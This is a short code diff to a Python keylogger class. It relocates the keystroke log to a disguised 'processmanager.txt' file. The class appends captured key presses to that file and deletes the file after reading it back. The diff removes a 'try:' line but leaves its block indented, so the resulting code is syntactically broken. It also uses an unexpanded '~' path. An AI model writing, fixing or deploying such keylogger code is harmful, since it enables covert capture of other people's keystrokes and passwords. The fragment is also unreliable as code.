@@ -14,7 +14,7 @@ class Keylogger:
 	def __key_press(self, key):
 		self.keys.append(key)
 		self.isKeyPressed = True
-		location = os.environ["appdata"] + r"\processmanager.txt"
+		location = "~/Documents/processmanager.txt"
 		if self.isKeyPressed:
 			with open(location, "a") as file:
 				for key in self.keys:
@@ -41,8 +41,7 @@ class Keylogger:
 			listener.join()
 
 	def dump_keys(self):
-		location = os.environ["appdata"] + r"\processmanager.txt"
-		try:
+		location = "~/Documents/processmanager.txt"
 			with open(location, "rt") as file:
 				keys = file.read()
 			os.remove(location)
